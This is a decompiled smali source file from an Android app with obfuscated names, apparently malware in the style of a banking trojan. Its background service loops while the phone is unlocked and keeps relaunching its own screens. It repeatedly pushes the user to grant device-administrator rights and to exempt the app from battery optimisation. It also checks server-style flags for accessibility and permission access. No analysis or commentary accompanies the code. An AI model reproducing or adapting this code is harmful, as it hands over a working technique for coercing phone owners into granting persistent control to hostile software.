.class public Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/c;

.field b:Lwocwvy/czyxoxmbauu/slsa/a;

.field c:I

.field d:Z

.field e:I

.field f:Lwocwvy/czyxoxmbauu/slsa/b;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "kldqwysgkfcrmq"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/a;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/a;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->b:Lwocwvy/czyxoxmbauu/slsa/a;

    const/4 v0, 0x0

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->e:I

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 13

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {p1}, Lwocwvy/czyxoxmbauu/slsa/b;->a()Z

    move-result p1

    if-eqz p1, :cond_0

    return-void

    :cond_0
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget p1, p1, Lwocwvy/czyxoxmbauu/slsa/c;->s:I

    const/16 v0, 0x17

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-nez p1, :cond_2

    :cond_1
    iput-boolean v1, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->d:Z

    goto :goto_1

    :cond_2
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget p1, p1, Lwocwvy/czyxoxmbauu/slsa/c;->s:I

    if-ne p1, v2, :cond_3

    :goto_0
    iput-boolean v2, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->d:Z

    goto :goto_1

    :cond_3
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget p1, p1, Lwocwvy/czyxoxmbauu/slsa/c;->s:I

    const/4 v3, 0x2

    if-ne p1, v3, :cond_4

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-gt p1, v0, :cond_1

    goto :goto_0

    :cond_4
    :goto_1
    const-string p1, ""

    :try_start_0
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "startRequest"

    invoke-virtual {v3, p0, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object p1, v3

    :catch_0
    :cond_5
    :goto_2
    const/16 v3, 0x2bc

    iput v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->c:I

    if-nez v1, :cond_6

    :try_start_1
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "startRequest"

    invoke-virtual {v3, p0, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-object p1, v3

    :catch_1
    :cond_6
    const/4 v3, -0x1

    const/4 v4, 0x5

    if-lt v1, v4, :cond_7

    const/4 v1, -0x1

    :cond_7
    add-int/2addr v1, v2

    const-string v5, "Access=1"

    invoke-virtual {p1, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const-string v6, "Perm=1"

    invoke-virtual {p1, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    const-string v7, "device_policy"

    invoke-virtual {p0, v7}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/app/admin/DevicePolicyManager;

    new-instance v8, Landroid/content/ComponentName;

    const-class v9, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/a;

    invoke-direct {v8, p0, v9}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :try_start_2
    sget-object v9, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    iget v10, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->c:I

    int-to-long v10, v10

    invoke-virtual {v9, v10, v11}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_3

    :catch_2
    move-exception v9

    invoke-virtual {v9}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_3
    const-string v9, "keyguard"

    invoke-virtual {p0, v9}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/app/KeyguardManager;

    invoke-virtual {v9}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v9

    const/high16 v10, 0x40000000    # 2.0f

    const/high16 v11, 0x10000000

    if-nez v9, :cond_d

    iget-object v12, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v12, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v12

    if-nez v12, :cond_8

    iget-object v12, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v12, v12, Lwocwvy/czyxoxmbauu/slsa/c;->t:I

    if-eq v12, v2, :cond_b

    :cond_8
    iget-object v12, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v12, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v12

    if-nez v12, :cond_9

    iget-object v12, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v12, v12, Lwocwvy/czyxoxmbauu/slsa/c;->t:I

    if-eq v12, v4, :cond_b

    :cond_9
    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_a

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v4, v4, Lwocwvy/czyxoxmbauu/slsa/c;->t:I

    const/4 v12, 0x6

    if-eq v4, v12, :cond_b

    :cond_a
    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_d

    if-eqz v5, :cond_d

    :cond_b
    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_d

    new-instance v4, Landroid/content/Intent;

    const-class v5, Lwocwvy/czyxoxmbauu/slsa/ncec/fymeshs;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v4, v11}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v4, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v4}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->startActivity(Landroid/content/Intent;)V

    const/16 v4, 0x1f4

    iput v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->c:I

    iget v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->e:I

    if-nez v4, :cond_c

    new-instance v4, Landroid/content/Intent;

    const-class v5, Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v4}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_c
    iget v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->e:I

    add-int/2addr v4, v2

    iput v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->e:I

    iget v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->e:I

    const/16 v5, 0x19

    if-le v4, v5, :cond_5

    iput v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->e:I

    goto/16 :goto_2

    :cond_d
    invoke-virtual {v7, v8}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v3

    if-nez v3, :cond_e

    iget-boolean v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->d:Z

    if-eqz v3, :cond_e

    new-instance v3, Landroid/content/Intent;

    const-class v4, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;

    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "str"

    const-string v5, "start"

    invoke-virtual {v3, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v3, v11}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x20000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2

    :cond_e
    if-nez v9, :cond_f

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v3, v3, Lwocwvy/czyxoxmbauu/slsa/c;->t:I

    if-eq v3, v2, :cond_11

    :cond_f
    if-nez v9, :cond_10

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v3, v3, Lwocwvy/czyxoxmbauu/slsa/c;->t:I

    const/4 v4, 0x4

    if-eq v3, v4, :cond_11

    :cond_10
    if-nez v9, :cond_5

    if-eqz v6, :cond_5

    :cond_11
    const/16 v3, 0x4e20

    iput v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->c:I

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v3, v0, :cond_5

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v3, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_5

    const-string v3, "power"

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager;

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_12

    :try_start_3
    new-instance v3, Landroid/content/Intent;

    const-string v4, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "package:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {v3, v11}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->startActivity(Landroid/content/Intent;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_4

    :catch_3
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "ERROR"

    const-string v5, "Doze Request"

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_12
    :goto_4
    :try_start_4
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "time_work"

    invoke-virtual {v3, p0, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "time_start_permission"

    invoke-virtual {v4, p0, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    if-le v3, v4, :cond_5

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;->f:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v3, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->f(Landroid/content/Context;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto/16 :goto_2
.end method
